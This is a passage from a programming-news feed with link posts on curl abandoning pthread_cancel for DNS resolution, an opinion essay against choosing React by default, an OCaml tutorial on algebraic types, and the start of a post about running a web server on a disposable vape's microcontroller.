runs.</p><p>But eventually, we have to get rid of the pthread again. Which means we either have to <code>pthread_join()</code> it - which means a blocking wait. Or we call <code>pthread_detach()</code> - which returns immediately but the thread keeps on running. Both are bad when you want to do many, many transfers. Either we block and stall or we let pthreads pile up in an uncontrolled way.</p><p>So, we added <code>pthread_cancel()</code> to interrupt a running <code>getaddrinfo()</code> and get rid of the pthread we no longer needed. So the theory. And, after some hair pulling, we got this working.</p><h2>cancel yes, leakage also yes!</h2><p>After releasing curl 8.16.0 we got an issue reported in <a href="https://github.com/curl/curl/issues/18532">#18532</a> that cancelled pthreads leaked memory.</p><p>Digging into the <a href="https://codebrowser.dev/glibc/glibc/nss/getaddrinfo.c.html#gaiconf_init">glibc source</a> shows that there is this thing called <a href="https://www.man7.org/linux/man-pages/man5/gai.conf.5.html"><code>/etc/gai.conf</code></a> which defines how <code>getaddrinfo()</code> should sort returned answers.</p><p>The implementation in glibc first resolves the name to addresses. For these, it needs to allocate memory. <em>Then</em> it needs to sort them if there is more than one address. And in order to do <em>that</em> it needs to read <code>/etc/gai.conf</code>. And in order to do <em>that</em> it calls <code>fopen()</code> on the file. And that may be a pthread &ldquo;Cancelation Point&rdquo; (and if not, it surely calls <code>open()</code> which is a required cancelation point).</p><p>So, the pthread may get cancelled when reading <code>/etc/gai.conf</code> and leak all the allocated responses. And if it gets cancelled there, it will try to read <code>/etc/gai.conf</code> <em>again</em> the next time it has more than one address resolved.</p><p>At this point, I decided that we need to give up on the whole <code>pthread_cancel()</code> strategy. The reading of <code>/etc/gai.conf</code> is one point where a cancelled <code>getaddrinfo()</code> may leak. There might be others. Clearly, glibc is not really designed to prevent leaks here (admittedly, this is not trivial).</p><h2>RIP</h2><p>Leaking memory potentially on something <code>libcurl</code> does over and over again is not acceptable. We&rsquo;d rather pay the price of having to eventually wait on a long running <code>getaddrinfo()</code>.</p><p>Applications using <code>libcurl</code> can avoid this by using <code>c-ares</code> which resolves unblocking and without the use of threads. But that will not be able to do everything that glibc does.</p><p>DNS continues to be tricky to use well.</p><ul> </ul> </div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:26:14 +0530</pubDate></item><item><link>https://www.lorenstew.art/blog/react-won-by-default/</link><title>React Won by Default – And It's Killing Frontend Innovation (lorenstew.art)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhw51a/react_won_by_default_and_its_killing_frontend/</guid><comments>https://www.reddit.com/r/programming/comments/1nhw51a/react_won_by_default_and_its_killing_frontend/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 9 min | <a href='https://www.reddit.com/r/programming/comments/1nhw51a/react_won_by_default_and_its_killing_frontend/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.lorenstew.art/og-image.png' /></section><section class='parsed-content'><div><article><div><p>React is no longer winning by technical merit. Today it is winning by default. That default is now slowing innovation across the frontend ecosystem.</p><p>When teams need a new frontend, the conversation rarely starts with &ldquo;What are the constraints and which tool best fits them?&rdquo; It often starts with &ldquo;Let&rsquo;s use React; everyone knows React.&rdquo; That reflex creates a self-perpetuating cycle where network effects, rather than technical fit, decide architecture.</p><p>Meanwhile, frameworks with real innovations struggle for adoption. Svelte compiles away framework overhead. Solid delivers fine-grained reactivity without virtual-DOM tax. Qwik achieves instant startup via resumability. These approaches can outperform React&rsquo;s model in common scenarios, but they rarely get a fair evaluation because React is chosen by default.</p><p>React is excellent at many things. The problem isn&rsquo;t React itself, it&rsquo;s the React-by-default mindset.</p><h2>The Innovation Ceiling</h2><p>React&rsquo;s technical foundations explain some of today&rsquo;s friction. The virtual DOM was a clever solution for 2013&rsquo;s problems, but as Rich Harris outlined in <a href="https://svelte.dev/blog/virtual-dom-is-pure-overhead">&ldquo;Virtual DOM is pure overhead&rdquo;</a>, it introduces work modern compilers can often avoid.</p><p>Hooks addressed class component pain but introduced new kinds of complexity: dependency arrays, stale closures, and misused effects. Even React&rsquo;s own docs emphasize restraint: <a href="https://react.dev/learn/you-might-not-need-an-effect">&ldquo;You Might Not Need an Effect&rdquo;</a>. Server Components improve time-to-first-byte, but add architectural complexity and new failure modes.</p><p>The <a href="https://react.dev/learn/react-compiler">React Compiler</a> is a smart solution that automates patterns like <code>useMemo</code>/<code>useCallback</code>. Its existence is also a signal: we&rsquo;re optimizing around constraints baked into the model.</p><p>Contrast this with alternative approaches: Svelte 5&rsquo;s <a href="https://svelte.dev/blog/runes">Runes</a> simplify reactivity at compile time; Solid&rsquo;s <a href="https://www.solidjs.com/docs/latest#reactivity">fine-grained reactivity</a> updates exactly what changed; Qwik&rsquo;s <a href="https://qwik.builder.io/docs/concepts/resumable/">resumability</a> eliminates traditional hydration. These aren&rsquo;t incremental tweaks to React&rsquo;s model&mdash;they&rsquo;re different models with different ceilings.</p><p>Innovation without adoption doesn&rsquo;t change outcomes. Adoption can&rsquo;t happen when the choice is made by reflex.</p><h2>The Technical Debt We&rsquo;re All Carrying</h2><p>Defaulting to React often ships a runtime and reconciliation cost we no longer question. Even when it&rsquo;s fast enough, the ceiling is lower than compile-time or fine-grained models. Developer time is spent managing re-renders, effect dependencies, and hydration boundaries instead of shipping value. The broader lesson from performance research is consistent: JavaScript is expensive on the critical path (<a href="https://medium.com/dev-channel/the-cost-of-javascript-84009f51e99e">The Cost of JavaScript</a>).</p><p>We&rsquo;ve centered mental models around &ldquo;React patterns&rdquo; instead of web fundamentals, reducing portability of skills and making architectural inertia more likely.</p><p>The loss isn&rsquo;t just performance, it&rsquo;s opportunity cost when better-fit alternatives are never evaluated. For instance, benchmarks like the <a href="https://krausest.github.io/js-framework-benchmark/">JS Framework Benchmark</a> show alternatives like Solid achieving up to 2-3x faster updates in reactivity-heavy scenarios compared to React.</p><h2>The Frameworks Being Suffocated</h2> <h3>Svelte: The Compiler Revolution</h3><p>Svelte shifts work to compile time: no virtual DOM, minimal runtime. Components become targeted DOM operations. The mental model aligns with web fundamentals.</p><p>But &ldquo;not enough jobs&rdquo; keeps Svelte adoption artificially low despite its technical superiority for most use cases. Real-world examples, like The Guardian&rsquo;s adoption of Svelte for their frontend, demonstrate measurable gains in performance and developer productivity, with reported reductions in bundle sizes and faster load times. For instance, as detailed in <a href="https://www.wired.com/story/javascript-framework-puts-web-pages-diet/">Wired&rsquo;s article on Svelte</a>, developer Shawn Wang (<a href="https://x.com/swyx">@swyx</a> on X/Twitter) reduced his site&rsquo;s size from 187KB in React to just 9KB in Svelte by leveraging its compile-time optimizations, which shift framework overhead away from runtime. This leads to faster, more efficient apps especially on slow connections.</p><h3>Solid: The Reactive Primitive Approach</h3><p>Solid delivers fine-grained reactivity with JSX familiarity. Updates flow through signals directly to affected DOM nodes, bypassing reconciliation bottlenecks. Strong performance characteristics, limited mindshare. As outlined in Solid&rsquo;s <a href="https://www.solidjs.com/guides/comparison">comparison guide</a>, this approach enables more efficient updates than React&rsquo;s virtual DOM, with precise reactivity that minimizes unnecessary work and improves developer experience through simpler state management.</p><p>While prominent case studies are scarcer than for more established frameworks, this is largely due to Solid&rsquo;s lower adoption. Yet anecdotal reports from early adopters suggest similar transformative gains in update efficiency and code simplicity, waiting to be scaled and shared as more teams experiment.</p><h3>Qwik: The Resumability Innovation</h3><p>Qwik uses resumability instead of hydration, enabling instant startup by loading only what the current interaction needs. Ideal for large sites, long sessions, or slow networks. According to Qwik&rsquo;s <a href="https://qwik.dev/docs/concepts/think-qwik/">Think Qwik guide</a>, this is achieved through progressive loading and serializing both state and code. Apps can thus resume execution instantly without heavy client-side bootstrapping, resulting in superior scalability and reduced initial load times compared to traditional frameworks.</p><p>Success stories for Qwik may be less visible simply because fewer teams have broken from defaults to try it. But those who have report dramatic improvements in startup times and resource efficiency, indicating a wealth of untapped potential if adoption grows.</p><p>All three under-adopted not for lack of merit, but because the default choice blocks trying them out.</p><p>Furthermore, React&rsquo;s API surface area is notably larger and more complex than its alternatives, encompassing concepts like hooks, context, reducers, and memoization patterns that require careful management to avoid pitfalls. This expansive API contributes to higher cognitive load for developers, often leading to bugs from misunderstood dependencies or over-engineering. For example, in Cloudflare&rsquo;s <a href="https://blog.cloudflare.com/deep-dive-into-cloudflares-sept-12-dashboard-and-api-outage/">September 12, 2025 outage</a>, a useEffect hook with a problematic dependency array triggered repeated API calls, overwhelming their Tenant Service and causing widespread failures. In contrast, frameworks like Svelte, Solid, and Qwik feature smaller, more focused APIs that emphasize simplicity and web fundamentals, reducing the mental overhead and making them easier to master and maintain.</p><h2>The Network Effect Prison</h2><p>React&rsquo;s dominance creates self-reinforcing barriers. Job postings ask for &ldquo;React developers&rdquo; rather than &ldquo;frontend engineers,&rdquo; limiting skill diversity. Component libraries and team muscle memory create institutional inertia.</p><p>Risk-averse leaders choose the &ldquo;safe&rdquo; option. Schools teach what jobs ask for. The cycle continues independent of technical merit.</p><p>That&rsquo;s not healthy competition; it&rsquo;s ecosystem capture by default.</p><h2>Breaking the Network Effect</h2><p>Escaping requires deliberate action at multiple levels. Technical leaders should choose based on constraints and merits, not momentum. Companies can allocate a small innovation budget to trying alternatives. Developers can upskill beyond a single mental model.</p><p>Educators can teach framework-agnostic concepts alongside specific tools. Open source contributors can help alternative ecosystems mature.</p><p>Change won&rsquo;t happen automatically. It requires conscious choice.</p><h2>Framework Evaluation Checklist</h2><p>To make deliberate choices, use this simple checklist when starting a new project:</p><ul> <li><strong>Assess Performance Needs</strong>: Evaluate metrics like startup time, update efficiency, and bundle size. Prioritize frameworks with compile-time optimizations if speed is critical.</li> <li><strong>Team Skills and Learning Curve</strong>: Consider existing expertise but factor in migration paths; many alternatives offer gentle ramps (e.g., Solid&rsquo;s JSX compatibility with React).</li> <li><strong>Scaling and Cost of Ownership</strong>: Calculate long-term costs, including maintenance, dependency management, and tech debt. Alternatives often reduce runtime overhead, lowering hosting costs and improving scalability.</li> <li><strong>Ecosystem Fit</strong>: Balance maturity with innovation; pilot in non-critical areas to test migration feasibility and ROI.</li> </ul> <h2>The Standard Counter&#8209;Arguments</h2><p><strong>&ldquo;But ecosystem maturity!&rdquo;</strong> Maturity is valuable, and can also entrench inertia. Age isn&rsquo;t the same as fitness for today&rsquo;s constraints.</p><p>Additionally, a mature ecosystem often means heavy reliance on third-party packages, which can introduce maintenance burdens like keeping dependencies up-to-date, dealing with security vulnerabilities, and bloating bundles with unused code. While essential in some cases, this flexibility can lead to over-dependence; custom solutions tailored to specific needs are often leaner and more maintainable in the long run. Smaller ecosystems in alternative frameworks encourage building from fundamentals, fostering deeper understanding and less technical debt. Moreover, with AI coding assistants now able to generate precise, custom functions on demand, the barrier to creating bespoke utilities has lowered dramatically. This makes it feasible to avoid generic libraries like lodash or date libraries like Moment or date-fns entirely in favor of lightweight, app-specific implementations.</p><p><strong>&ldquo;But hiring!&rdquo;</strong> Hiring follows demand. You can de&#8209;risk by piloting alternatives in non&#8209;critical paths, then hiring for fundamentals plus on&#8209;the&#8209;job training.</p><p><strong>&ldquo;But component libraries!&rdquo;</strong> Framework&#8209;agnostic design systems and Web Components reduce lock-in while preserving velocity.</p><p><strong>&ldquo;But stability!&rdquo;</strong> React&rsquo;s evolution from classes to hooks to Server Components demonstrates constant churn, not stability. Alternative frameworks often provide more consistent APIs.</p><p><strong>&ldquo;But proven at scale!&rdquo;</strong> jQuery was proven at scale too. Past success doesn&rsquo;t guarantee future relevance.</p><h2>The Broader Ecosystem Harm</h2><p>Monoculture slows web evolution when one framework&rsquo;s constraints become de facto limits. Talent spends cycles solving framework-specific issues rather than pushing the platform forward. Investment follows incumbents regardless of technical merit.</p><p>Curricula optimize for immediate employability over fundamentals, creating framework-specific rather than transferable skills. Platform improvements get delayed because &ldquo;React can handle it&rdquo; becomes a default answer.</p><p>The entire ecosystem suffers when diversity disappears.</p><h2>The Garden We Could Grow</h2><p>Healthy ecosystems require diversity, not monocultures. Innovation emerges when different approaches compete and cross-pollinate. Developers grow by learning multiple mental models. The platform improves when several frameworks push different boundaries.</p><p>Betting everything on one model creates a single point of failure. What happens if it hits hard limits? What opportunities are we missing by not exploring alternatives?</p><p>It&rsquo;s time to choose frameworks based on constraints and merit rather than momentum. Your next project deserves better than React-by-default. The ecosystem deserves the innovation only diversity can provide.</p><p>Stop planting the same seed by default. The garden we could cultivate through diverse framework exploration would be more resilient and more innovative than the monoculture we&rsquo;ve drifted into.</p><p>The choice is ours to make.</p></div></article> </div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:20:31 +0530</pubDate></item><item><link>https://blog.aiono.dev/posts/algebraic-types-are-not-scary,-actually.html</link><title>Algebraic Types are not Scary, Actually (blog.aiono.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhw43z/algebraic_types_are_not_scary_actually/</guid><comments>https://www.reddit.com/r/programming/comments/1nhw43z/algebraic_types_are_not_scary_actually/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 17 min | <a href='https://www.reddit.com/r/programming/comments/1nhw43z/algebraic_types_are_not_scary_actually/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><hgroup><h4> Posted on <text>2025-08-30</text> </h4> </hgroup><p>You may have heard the term algebraic types before, which initially sounds like an advanced concept, that only someone with a PhD in programming languages can understand. Quite the contrary, algebraic types is a very simple and helpful concept about programming in general. Anyone who knows basic algebra could understand what algebraic types are.</p><p>In this article I aim to provide an explanation of algebraic types for the working programmer. I intentionally avoid any terminology that a regular programmer may not know about. I hope by the end of the article you know what algebraic types are and can use it in real programming and spot it where it appears.</p><h2>Types as Sets</h2><p>What is a type, really? For instance, when we write <code>int</code>, what does it mean? One useful way to think about it is to treat types as sets. In this perspective, every type is treated as a set of possible values that is compatible with the type. For instance, <code>bool</code> is a type that has only <code>true</code> and <code>false</code> values. In OCaml <code>bool</code> is defined as:</p><pre><code>type bool = true | false </code></pre><p>In the left hand side we define the type <code>bool</code>. The right side provides the possible values, separated with <code>|</code>.</p><p>For integers, this is <code>0</code>, <code>1</code> or any other integer value. It's a bit more difficult to define integers directly as a regular type because in this case there are infinitely many values that integer can take. Writing all these is impossible. But assuming it was possible, we could write:</p><pre><code>type int = ... | -3 | -2 | -1 | 0 | 1 | 2 | 3 | ... </code></pre><p>In practice, integer types are usually limited to some finite range (but still too large) but this is not related to what we are discussing here. Strings are very similar to integers from this perspective.</p><p>What about <code>void</code> type? What are the values that it accepts? In some languages it's not obvious, but we can think <code>void</code> as a type with only a single possible value. In OCaml for instance, <code>unit</code> corresponds to <code>void</code>. It's defined as:</p><pre><code>type unit = () </code></pre><p>In C, C++ or Java, <code>void</code> is treated differently than other types which makes it awkward to use in some cases. If we consider it as just any other type, there is no real need to make an exception for <code>void</code>. This simplifies the type system as well as the implementation of the programming language. I will give some examples to this after we understand <a href="https://blog.aiono.dev#algebraic-types-is-not-scary-actually">Algebraic Types</a>.</p><p>Another interesting case is non-termination. What is the type of a while loop that never returns? Well, using the set perspective, if the expression returns no value, maybe it's type is a type which has no possible values? Note that this type is <em>different</em> than <code>void</code> because <code>void</code> has one value that it can take but this type can take none. Sometimes this type is called <code>never</code>, as in it's never possible to have a value of this type. We can also trivially define this type as:</p><pre><code>type never </code></pre><p>Since there is no value for this type, it is <em>impossible</em> to have a value of this type. Thus we can use it as the type of expressions or functions that doesn't terminate. Because, if it would terminate and return a value we would get a type error indicating that the value doesn't conform to the specified type.</p><h2>Algebraic Types are Just Elementary School Algebra</h2><p>Using this view of types as sets of values, it's really easy to understand algebraic types. In fact, it's actually based on the algebra you learned in elementary school!</p><p>What is algebra on numbers? It's addition, multiplication, subtraction and division. Algebraic types are exactly that, it's basically <em>doing algebra over types</em>. So basically it's addition and multiplication over types.</p><h3>Product Types</h3><p>Let's start with the more familiar one. If you have two types <code>T1</code> and <code>T2</code>, what other types you can have with it? Well, you can have a value that contains from both of these types, one from <code>T1</code> and one from <code>T2</code>. Similar to how a <code>struct</code> or <code>class</code> works in mainstream languages. We could express this in Java as:</p><pre><code>class Pair { T1 first; T2 second; } </code></pre><p>In the algebraic type terminology, this is called a <em>product type</em>. The reason is simple, when you combine two types, the resulting type contains every value whose parts are the values from the respective types. If the first type has <code>N</code> values, and the second has <code>M</code> values. Let's assume both to be enum types, with <code>N</code> having 2 and <code>M</code> having 3 variants. If we create a pair type from <code>N</code> and <code>M</code>, we could have <code>6</code> different values. Because we can choose 2 from <code>N</code> and 3 from <code>M</code>, which results with <code>2 * 3 = 6</code>. Hence, a pair type in the general case has <code>N * M</code> many values, hence the term product.</p><p>Every mainstream language supports this notion, because it's a very common use case, I am sure that this doesn't need any convincing. However, most languages doesn't support combining two types as a first class construct such as tuple types, therefore one has to explicitly define a new type for every combination. In practice, this lack leads to worse API designs, like the pattern of using pointers/references <sup><a href="https://blog.aiono.dev#fn-1">[1]</a></sup>to return multiple values or Go's multiple return values <sup><a href="https://blog.aiono.dev#fn-2">[2]</a></sup>, because to return multiple arguments one has to create a custom type. Not having product types forces you to circumvent it with more specialized constructs that creates accidental complexity. Supporting product types as first class (See Rust and OCaml as examples) makes the language simpler and more unified, reducing the cognitive load for the user <sup><a href="https://blog.aiono.dev#fn-3">[3]</a></sup>.</p><h3>Sum Types</h3><p>Now this part is a bit less apparent if you never used a functional language. But it's a really a common use case in programming that, you probably seen a problem before where you could use sum types.</p><p>A sum type is a type composed of two other types, where the values can be <em>either</em> from the first type or the second type. For instance if you want to denote a fallible arithmetic operation, where the result is <code>int</code> if successful and a <code>string</code> containing the error message if not, the type of this result is <code>int</code> or <code>string</code>.</p><p>The name sum comes from the fact that, similar to products, if you create a sum type from types <code>N</code> and <code>M</code>, you get a type where there are <code>N + M</code> different possible values. Because you can have <code>N</code> options from the first and <code>M</code> option from the second. It's similar to logical or in the sense that, a value of a sum type is actually from the first type <em>or</em> the second type.</p><p>Sum types appear commonly in real life. A value that can be <code>null</code> is a sum type, usually called <code>Option</code> or <code>Maybe</code> in programming languages. In OCaml it is defined as:</p><pre><code>type a option = Some of a | None </code></pre><p>The <code>a</code> denotes a generic type, if you are familiar with Java, it is equivalent to <code>Option<a></a></code>. First construct <code>Some</code> is the case where a value is present, while <code>None</code> corresponds to <code>null</code> in imperative languages. This is not just an example, <code>option</code> type is very commonly used in programs written in OCaml and other functional languages. <code>null</code> being at the type level prevents many runtime errors and reduces verbosity (you don't have to write <code>null</code> checks everywhere).</p><p>Another example is modeling errors. In Go, when a function can return an error, it's idiomatic to return it as the second value. By convention, either the first value or the second value is <code>nil</code> (Go's <code>null</code> value). However, this convention is implicit and in nowhere is enforced. So when you return two values, you have 4 cases, but you actually assume only two cases can happen in practice. If both values are not <code>null</code> or <code>null</code>, that would violate the assumption. We can summarize it in a table:</p><div><table> <tr> <th>Value 1</th> <th>Value 2</th> <th>Assumed</th> </tr> <tr> <td><code>present</code></td> <td><code>null</code></td> <td>yes</td> </tr> <tr> <td><code>null</code></td> <td><code>null</code></td> <td>yes</td> </tr> <tr> <td><code>present</code></td> <td><code>present</code></td> <td>no</td> </tr> <tr> <td><code>null</code></td> <td><code>null</code></td> <td>no</td> </tr> </table></div><p>The problem is, this invariant is never validated by the type checker and therefore the user has to be aware of the convention, which creates unnecessary cognitive load for the user. For instance, <code>io.Reader</code> interface may return <code>EOF</code> error <em>while also returning some data</em>. This is not what the general Go programmers assume to be the case, since they expect either <code>err</code> or <code>val</code> to be non-<code>nil</code>. This discrepancy causes <a href="https://github.com/golang/go/issues/52577">real life</a> <a href="https://www.reddit.com/r/golang/comments/u8wsnq/i_was_using_ioreader_wrongly/">bugs</a> even though <a href="https://pkg.go.dev/io#Reader">it's documented</a>.</p><p>Another disadvantage is that the programmer can't know the product is in fact intended to model a sum type unless it's in the documentation or they read the whole code. Both of these create more cognitive load compared to sum type in the signature. Moreover, the lack of sum types cause real life bugs in general, like anything that requires human validation, such as <a href="https://nicolashery.com/decoding-json-sum-types-in-go/#my-first-nil-pointer-panic-in-go-was-due-to-lack-of-sum-types">this one</a>.</p><p>Instead, we could simply use a sum type to denote it's <em>either</em> a success with the result value, or an error with the error information. In OCaml, there is <code>result</code> type exactly for that:</p><pre><code>type (a, b) result = Ok of a | Error of b </code></pre><p>When we have a value of type <code>error</code>, the type checker enforces that only two desired conditions can happen, and the undesired conditions are <em>impossible</em> to represent in code, making the code simpler and less prone to errors.</p><h3>Using Algebraic Types in Practice</h3><p>To demonstrate the practical benefits of algebraic types, lets write an interpreter for arithmetic expressions. We will only have integers and arithmetic operators. We will not go through parsing arithmetic expressions as it's not related to the topic.</p><p>The type of expressions follows naturally from the definition:</p><pre><code>type expr = | Number of int | Add of { left : expr; right: expr } | Sub of { left : expr; right: expr } | Mul of { left : expr; right: expr } | Div of { left : expr; right: expr } </code></pre><p>The first case denotes integers for the operands. Following cases correspond to each arithmetic operator. For instance, <code>2 + (3 * 2)</code> corresponds to:</p><pre><code>let e = Add { left = Number 2; right = Mul { left = Number 3; right = Number 2; } } </code></pre><p>To evaluate expressions, we can write a simple evaluator, using pattern matching:</p><pre><code>let rec eval (e : expr) : int = match e with | Number n -&gt; n | Add { left; right } -&gt; (eval left) + (eval right) | Sub { left; right } -&gt; (eval left) - (eval right) | Mul { left; right } -&gt; (eval left) * (eval right) | Div { left; right } -&gt; (eval left) / (eval right) </code></pre><p>If you are not familiar with pattern matching, it lets us determine the which variant the value has. The possible variants come from it's type. In this case, from the definition of <code>expr</code>, we know it's either a <code>Number</code> or one of the 4 operations. For the number case, we can return it directly. In other cases, the <code>left</code> and <code>right</code> fields have type <code>expr</code>, so first we have to recursively evaluate those subterms to get their <code>int</code> value. Then we can evaluate the current expression value by using the appropriate operator.</p><p>How could you do this without algebraic types? Abstract methods with inheritance can be used to emulate sum types. So we could have an abstract base class <code>Expr</code> then extend it for each case:</p><pre><code>abstract class Expr { abstract int eval(); } class Number extends Expr { int value; int eval() { return value; } } class Plus extends Expr { Expr left, right; int eval() { return left.eval() + right.eval(); } } // Rest is omitted </code></pre><p>The base class <code>Expr</code> has a method <code>eval</code> which should return the evaluated value of the expression. Each subclass implements it, recursively calling subexpression's <code>eval</code> method. In this case, there is no clear definition of the data structure, but it's mixed with the behavior.</p><p>What if we want to interpret the expressions in a different way? Say we just want to convert it to it's written form. For the inheritance based solution, we would have to add a new base method to the class, and then implement it in the subclasses, like <code>eval</code>. With algebraic types, we could write another function that performs pattern matching. Something like:</p><pre><code>let rec expr_to_string (e : expr) : string = match e with | Number n -&gt; string_of_int n | Add { left; right } -&gt; "(" ^ (expr_to_string left) ^ "+" ^ (expr_to_string right) ^ ")" | Sub { left; right } -&gt; "(" ^ (expr_to_string left) ^ "-" ^ (expr_to_string right) ^ ")" | Mul { left; right } -&gt; "(" ^ (expr_to_string left) ^ "*" ^ (expr_to_string right) ^ ")" | Div { left; right } -&gt; "(" ^ (expr_to_string left) ^ "/" ^ (expr_to_string right) ^ ")" </code></pre><p>I don't know you but I find the latter approach better. Because in the inheritance approach the relevant behavior is far away from each other. When someone wants to understand how string conversion works, they need to jump through every class. Whereas with the pattern matching, the relevant logic stays closer. Another issue is that operations implemented as a method in the class, therefore they have full access to the object's internals. However, those operations should only access the public interface of the objects.</p><p>The abstract method approach is not the only alternative. The Visitor Pattern <sup><a href="https://blog.aiono.dev#fn-4">[4]</a></sup>exists specifically to model sum types with object hierarchies <sup><a href="https://blog.aiono.dev#fn-6">[5]</a></sup>. Using visitor pattern, we could have the following implementation:</p><pre><code>abstract class Expr { abstract <r> R accept(Visitor<r> visitor); } class Number extends Expr { int value; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Plus extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Mul extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Sub extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } class Div extends Expr { Expr left, right; <r> R accept(Visitor<r> visitor) { return visitor.visit(this); } } interface Visitor<r> { R visit(Number number); R visit(Plus plus); R visit(Mul mul); R visit(Sub sub); R visit(Div div); } class EvalVisitor implements Visitor<integer> { public Integer visit(Number number) { return number.value; } public Integer visit(Plus plus) { return plus.left.accept(this) + plus.right.accept(this); } public Integer visit(Mul mul) { return mul.left.accept(this) * mul.right.accept(this); } public Integer visit(Sub sub) { return sub.left.accept(this) - sub.right.accept(this); } public Integer visit(Div div) { return div.left.accept(this) / div.right.accept(this); } } </integer></r></r></r></r></r></r></r></r></r></r></r></r></r></code></pre><p>It solves the problem of having to add new methods to the base class compared to naive inheritance approach. Also the relevant logic sits inside a single place, in this case the visitor implementation. However, it's a lot more verbose than pattern matching and more difficult to understand. It has more accidental complexity <sup><a href="https://blog.aiono.dev#fn-5">[6]</a></sup>compared to pattern matching. Essentially visitor pattern is poor man's pattern matching. As Mark Seeman said <sup><a href="https://blog.aiono.dev#fn-6">[5]</a></sup>:</p><blockquote><p>That's not to say that these two representations are equal in readability or maintainability. F# and Haskell sum types are declarative types that usually only take up a few lines of code. Visitor, on the other hand, is a small object hierarchy; it's a more verbose way to express the idea that a type is defined by mutually exclusive and heterogeneous cases. I know which of these alternatives I prefer, but if I were caught in an object-oriented code base, it's nice to know that it's still possible to model a domain with algebraic data types.</p></blockquote> <h2>Conclusion</h2><p>In short, for the most programming tasks you need two fundamental ways to combine types: the product and the sum. With these you can create arbitrary structures that can model real world data. Most languages have a way to express these two constructs, albeit some ways to represent it are more cumbersome such as using inheritance to emulate sum types. Using fundamental concepts you can model things in a simpler way without introducing unnecessary complexity.</p><h2>Credits</h2><p>Thanks <a href="https://www.rugu.dev/">U&#287;ur</a> for his detailed and valuable feedback on the draft of this article.</p><section><ol> <li><p><a href="https://stackoverflow.com/questions/2620146/how-do-i-return-multiple-values-from-a-function-in-c">How do I return multiple values from a function in C? - Stackoverflow</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-1">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://herecomesthemoon.net/2025/03/multiple-return-values-in-go/">Were multiple return values Go's biggest mistake?</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-2">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://minds.md/zakirullin/cognitive">Cognitive load is what matters</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-3">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://en.wikipedia.org/wiki/Visitor_pattern">Visitor Pattern</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-4">&#8617;&#65038;&#65038;</a></span></li><li><p><a href="https://blog.ploeh.dk/2018/06/25/visitor-as-a-sum-type/">Visitor is a sum type</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-6">&#8617;&#65038;&#65038;<sup>1</sup></a><a href="https://blog.aiono.dev#ref-2-fn-6">&#8617;&#65038;&#65038;<sup>2</sup></a></span></li><li><p><a href="https://www.cs.unc.edu/techreports/86-020.pdf">No Silver bullet</a></p><span><a href="https://blog.aiono.dev#ref-1-fn-5">&#8617;&#65038;&#65038;</a></span></li></ol></section> </div></section>]]></description><pubDate>Tue, 16 Sep 2025 01:19:35 +0530</pubDate></item><item><link>https://bogdanthegeek.github.io/blog/projects/vapeserver/</link><title>Hosting a website on a disposable vape (bogdanthegeek.github.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/</guid><comments>https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/'>Post permalink</a></p></section><section class='preview-image'><img src='https://bogdanthegeek.github.io/blog/images/vapeserver.jpg' /></section><section class='parsed-content'><div><h2>Preface<a href="https://bogdanthegeek.github.io#preface">#</a></h2><p>This article is <em>NOT</em> served from a web server running on a disposable vape. If you want to see the real deal, click <a href="http://ewaste.fka.wtf">here</a>. The content is otherwise identical.</p><h2>Background<a href="https://bogdanthegeek.github.io#background">#</a></h2><p>For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for &ldquo;future&rdquo; projects (It&rsquo;s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn&rsquo;t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as &ldquo;disposable&rdquo;. Thankfully, I don&rsquo;t plan on pursuing law anytime soon.</p><p>Last year, I was tearing apart some of these fancier pacifiers for adults when I noticed something that caught my eye, instead of the expected black blob of goo hiding some ASIC (Application Specific Integrated Circuit) I see a little integrated circuit inscribed &ldquo;PUYA&rdquo;. I don&rsquo;t blame you if this name doesn&rsquo;t excite you as much it does me, most people have never heard of them. They are most well known for their flash chips, but I first came across them after reading Jay Carlson&rsquo;s blog post about <a href="https://jaycarlson.net/2023/02/04/the-cheapest-flash-microcontroller-you-can-buy-is-actually-an-arm-cortex-m0/">the cheapest flash microcontroller you can buy</a>. They are quite capable little ARM Cortex-M0+ micros.</p><p>Over the past year I have collected quite a few of these PY32 based vapes, all of them from different models of vape from the same manufacturer. It&rsquo;s not my place to do free advertising for big tobacco, so I won&rsquo;t mention the brand I got it from, but if anyone who worked on designing them reads this, thanks for labeling the debug pins!</p><h2>What are we working with<a href="https://bogdanthegeek.github.io#what-are-we-working-with">#</a></h2><p>The chip is marked <code>PUYA C642F15</code>, which wasn&rsquo;t very helpful. I was pretty sure it was a <code>PY32F002A</code>, but after poking around with <a href="http://pyocd.io/">pyOCD</a>, I noticed that the flash was 24k and we have 3k of RAM. The extra flash meant that it was more likely a <code>PY32F002B</code>, which is actually a very different chip.<sup><a href="https://bogdanthegeek.github.io#fn:1">1</a></sup></p><p>So here are the specs of a microcontroller so <em>bad</em>, 